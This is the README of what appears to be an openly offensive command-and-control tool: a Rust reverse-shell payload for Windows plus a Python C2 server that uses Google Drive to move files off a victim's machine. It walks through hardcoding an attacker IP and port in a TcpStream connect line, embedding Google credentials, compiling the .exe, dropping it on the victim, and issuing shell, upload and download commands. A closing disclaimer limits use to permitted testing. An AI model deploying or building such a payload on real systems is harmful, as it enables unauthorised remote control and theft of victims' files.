# Google Drive Command and Control (C2) System

This project provides a Command and Control (C2) system using the Google Drive API and a reverse shell payload written in Rust. The system allows uploading and downloading files to/from Google Drive from a victim's machine and executing commands on the target machine via a C2 server.

# Features
- Reverse shell payload written in Rust
- Upload and download files from the victim's machine to Google Drive
- Command execution on the victim's machine through a TCP connection
- Works with a Google Service Account for authentication
# Prerequisites
Google Service Account: You need to create a Google Cloud project, enable the Google Drive API, and download the Service Account credentials (JSON).
Rust Toolchain: Ensure you have Rust installed. If not, install it from Rust's official site.
How to Use
1. Setup
Add the Google Service Account JSON file to the src/ directory of the Rust project (used in main.rs).
Update main.rs with your Google Drive folder ID.
2. Compiling the Rust Payload
Before compiling, on src/main.rs in payload folder, change this:
- folder ID on ``` const FOLDER_ID: &str = "INPUT YOUR GGDRIVE ID"; ```
- drop your json file in /src and put your json name in ```let service_account_json = include_str!("yourjsonfilename.json");```
- your attacker's machine ip + port number at ```let mut stream = TcpStream::connect("192.168.247.131:4444").expect("Failed to connect");```
To compile the Rust payload, follow these steps:
```
# Build for a Windows target
cargo build --target x86_64-pc-windows-gnu --release
```
This will generate an .exe file in the target/x86_64-pc-windows-gnu/release folder.

3. Running the C2 Server
On your attacker machine (C2 server), you will run the following Python script to listen for incoming connections and send commands:
```
python3 C2_DriveAPI.py
```
4. Reverse Shell on Victim's Machine
After compiling, transfer the compiled .exe payload to the victim's machine and execute it.

5. Available Commands
- Execute commands: Any system command can be executed as follows:
```
<command>
```
For example:
```
dir
```
- Upload a file to Google Drive:
```
upload;<file_path>
```
For example:
```
upload;C:\Users\Administrator\Documents\example.txt
```
Download a file from Google Drive:
```
download;<file_id>;<local_file_path>
```
For example:
```
download;1vjkwFQJXMpVps5Zd2yD54syoXMEw98Fb;C:\Users\Administrator\Downloads\test.png
```
6. Example C2 Usage
Start the C2 server: Run the c2-server.py script on your attacker machine.
Run the payload: Drop and execute the compiled payload on the victim's machine.
Command execution: After the reverse shell is established, issue commands such as file upload, download, or OS command execution.
Dependencies
The Rust project uses the following dependencies:
- yup-oauth2
- reqwest
- tokio
- serde
- serde_json
- mime

Make sure to install these by running:
```
cargo build
```
# License
This project is licensed under the Apache License 2.0. See the [LICENSE](https://github.com/apache/.github/blob/main/LICENSE) for details.

# Disclaimer
This project is intended for educational purposes only. The author is not responsible for any misuse of this software. Use this project only on machines you have explicit permission to test.
